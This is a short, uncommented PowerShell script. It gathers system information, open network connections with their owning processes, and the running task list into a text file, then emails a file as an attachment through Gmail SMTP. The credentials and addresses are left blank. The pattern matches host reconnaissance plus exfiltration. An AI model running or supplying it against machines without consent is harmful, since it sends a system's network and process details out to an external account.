systeminfo /s LOCALHOST | Out-File output.txt
netstat -a -n -o | Out-File output.txt -append
tasklist | Out-File output.txt -append

$user = ""
$password = ""

$EmailTo = ""
$EmailFrom = ""
$AttachPath = ""

$MailMessage = New-Object Net.Mail.MailMessage($EmailFrom, $EmailTo)
$MailMessage.Subject = ""
$MailMessage.Body = ""
$Attachment = New-Object System.Net.Mail.Attachment($AttachPath, 'text/plain')
$MailMessage.Attachments.Add($Attachment)

$SMTPServer = "smtp.gmail.com"
$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer,587)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($user,$password)
$SMTPClient.Send($MailMessage)
